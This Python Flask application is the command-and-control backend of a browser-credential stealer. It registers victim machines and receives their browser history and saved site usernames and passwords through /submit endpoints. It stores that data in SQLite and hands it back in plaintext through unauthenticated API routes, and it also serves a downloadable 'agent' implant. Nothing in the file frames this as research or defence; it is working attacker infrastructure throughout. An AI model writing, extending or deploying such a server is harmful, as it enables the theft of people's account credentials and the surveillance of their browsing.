from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timedelta
import os

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'hosts.db')

app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_PATH}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = BASE_DIR

db = SQLAlchemy(app)

# ========== DATABASE MODELS ==========
class Host(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), unique=True, nullable=False)
    hostname = db.Column(db.String(64))
    ip_address = db.Column(db.String(64))
    os_info = db.Column(db.String(128))
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)

class History(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
    url = db.Column(db.Text)
    title = db.Column(db.Text)
    visit_time = db.Column(db.String(128))
    browser_type = db.Column(db.String(16))

class Credential(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
    website = db.Column(db.String(256))
    username = db.Column(db.String(128))
    password = db.Column(db.Text)
    browser_type = db.Column(db.String(16))

# ========== ROUTES ==========
@app.route("/")
def login():
    return render_template("index.html")

@app.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")

@app.route("/about")
def about():
    return render_template("about.html")

@app.route("/clients")
def clients():
    return render_template("clients.html")

@app.route("/collected")
def collected():
    return render_template("collected.html")

@app.route("/register", methods=["POST"])
def register_host():
    data = request.get_json()
    if not data or "machine_id" not in data:
        return jsonify({"status": "error", "reason": "missing machine_id"}), 400

    host = Host.query.filter_by(machine_id=data["machine_id"]).first()
    if host:
        host.last_seen = datetime.utcnow()
        host.hostname = data.get("hostname", host.hostname)
        host.ip_address = data.get("ip_address", host.ip_address)
        host.os_info = data.get("os_info", host.os_info)
    else:
        host = Host(**data)
        db.session.add(host)

    db.session.commit()
    return jsonify({"status": "ok"})

@app.route("/api/clients")
def api_clients():
    now = datetime.utcnow()
    clients = Host.query.all()
    data = []
    for host in clients:
        delta = now - host.last_seen
        status = "active" if delta < timedelta(minutes=10) else "inactive"
        data.append({
            "machine_id": host.machine_id,
            "hostname": host.hostname,
            "ip_address": host.ip_address,
            "last_seen": host.last_seen.strftime("%Y-%m-%d %H:%M:%S"),
            "os_info": host.os_info,
            "status": status
        })
    return jsonify(data)

@app.route("/api/history/<machine_id>")
def api_history(machine_id):
    rows = History.query.filter_by(machine_id=machine_id).order_by(History.visit_time.desc()).all()
    return jsonify([
        {
            "url": r.url,
            "title": r.title,
            "visit_time": r.visit_time,
            "browser_type": r.browser_type
        } for r in rows
    ])

@app.route("/api/credentials/<machine_id>")
def api_credentials(machine_id):
    rows = Credential.query.filter_by(machine_id=machine_id).all()
    return jsonify([
        {
            "website": r.website,
            "username": r.username,
            "password": r.password,
            "browser_type": r.browser_type
        } for r in rows
    ])


@app.route("/submit/history", methods=["POST"])
def receive_history():
    data = request.get_json()
    machine_id = data.get("machine_id")
    entries = data.get("history", [])
    for item in entries:
        db.session.add(History(machine_id=machine_id, **item))
    db.session.commit()
    return jsonify({"status": "ok", "count": len(entries)})

@app.route("/submit/credentials", methods=["POST"])
def receive_credentials():
    data = request.get_json()
    machine_id = data.get("machine_id")
    entries = data.get("credentials", [])
    for item in entries:
        db.session.add(Credential(machine_id=machine_id, **item))
    db.session.commit()
    return jsonify({"status": "ok", "count": len(entries)})

@app.route("/download/agent")
def download_agent_page():
    return render_template("download.html")

@app.route("/download/<path:filename>")
def download_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)

# ========== ENTRY ==========
if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=5000)
